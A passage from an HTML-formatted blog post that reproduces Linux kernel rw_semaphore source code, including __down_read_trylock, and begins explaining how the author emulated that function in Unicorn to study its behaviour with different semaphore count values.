pre-wrap;">count</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">atomic_long_t</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">owner</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #9c27b0; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">struct</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">optimistic_spin_queue</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">osq</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">/*</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">spinner</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">MCS</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">lock</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">*/</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">raw_spinlock_t</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">wait_lock</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #9c27b0; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">struct</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">list_head</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">wait_list</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">};</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">...</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #9c27b0; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">static</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #9c27b0; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">inline</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #9c27b0; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">int</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">__down_read_trylock</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="color: #9c27b0; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">struct</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">rw_semaphore</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">*</span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">sem</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #9c27b0; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">long</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">tmp</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">DEBUG_RWSEMS_WARN_ON</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">sem-</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&gt;</span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">magic</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">!</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">sem,</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">sem</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">tmp</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">atomic_long_read</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&amp;</span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">sem-</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&gt;</span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">count</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #9c27b0; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">while</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">!</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">tmp</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&amp;</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">RWSEM_READ_FAILED_MASK</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">))</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #9c27b0; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">if</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">atomic_long_try_cmpxchg_acquire</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&amp;</span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">sem-</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&gt;</span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">count,</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&amp;</span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">tmp,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp; &nbsp; </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">tmp</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">+</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">RWSEM_READER_BIAS</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">))</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">rwsem_set_reader_owned</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">sem</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #9c27b0; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">return</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #f57d02; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">1</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #9c27b0; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">return</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #f57d02; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0</span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">It was helpful to emulate the </span><span style="background-color: #ea9999; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">down_read_trylock()</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> in unicorn to determine how it behaves when given different </span><span style="background-color: #b4a7d6; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">sem-&gt;count</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: 